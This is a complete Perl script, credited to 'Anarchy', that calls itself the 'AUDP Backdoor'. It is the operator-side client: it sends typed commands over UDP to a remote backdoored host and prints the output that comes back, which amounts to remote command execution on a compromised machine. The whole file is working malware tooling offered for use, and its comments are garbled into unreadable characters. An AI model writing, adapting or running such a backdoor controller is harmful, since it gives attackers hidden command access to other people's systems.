#!/usr/bin/perl

use IO::Socket;
use Getopt::Std;


getopts('s:p:h', \%opt)||die("Error: Unable to get command line options !!!\n"); 

if(defined($opt{'h'})) { \&usage() }  							
if(defined($opt{'s'})) { $server=$opt{'s'} } else { \&usage() }
if(defined($opt{'p'})) { $port=$opt{'p'} } else { \&usage() }


$|=1;
$maxlen=1024;

$sock=IO::Socket::INET->new(Proto=>'udp')
or die("Error: Cannot initialize socket !!!\n");
$ipaddr=inet_aton($server);
$portaddr=sockaddr_in($port, $ipaddr);


print("\nAUDP Backdoor started.\n");
print("======================\n");

while(1) {
 print("=> ");
 $mesg=<STDIN>;
 chomp $mesg;
 #�᫨ ��室�� � ��砫� ��ப� (���ᨬ��� ^) ���� �� ᫮� ��ࠬ������ �஡�����, � ��室�� �� �ணࠬ��
 if($mesg=~/^\s*(exit)|(quit)\s*/i) { exit(0) }	
 #�᫨ � ��砫� ��ப� ᨬ��� ������ �⠪㥬 㤠����� �ࢥ�
 if($mesg!~/^\s*$/) {
  send($sock, $mesg."\n", 0, $portaddr)==length($mesg."\n");
  # ��᫠�� ᮮ�饭�� �� 1024 ������ $ ������ �� �� ���, ���� ���짮��⥫� �� ���� ��-� �த� -end $		  
  while($portaddr=recv($sock, $msg, $maxlen, 0)) { 
   if($msg=~/^\-end\.$/) { last } else {
    print $msg;
   }
  }
 }
} 



sub usage() {
   print("\nAUDP - Programmed by Anarchy\n");
   print("============================\n");
   print("Usage: AUDP -s <host> -p <port>\n\n");
   exit 1;
}

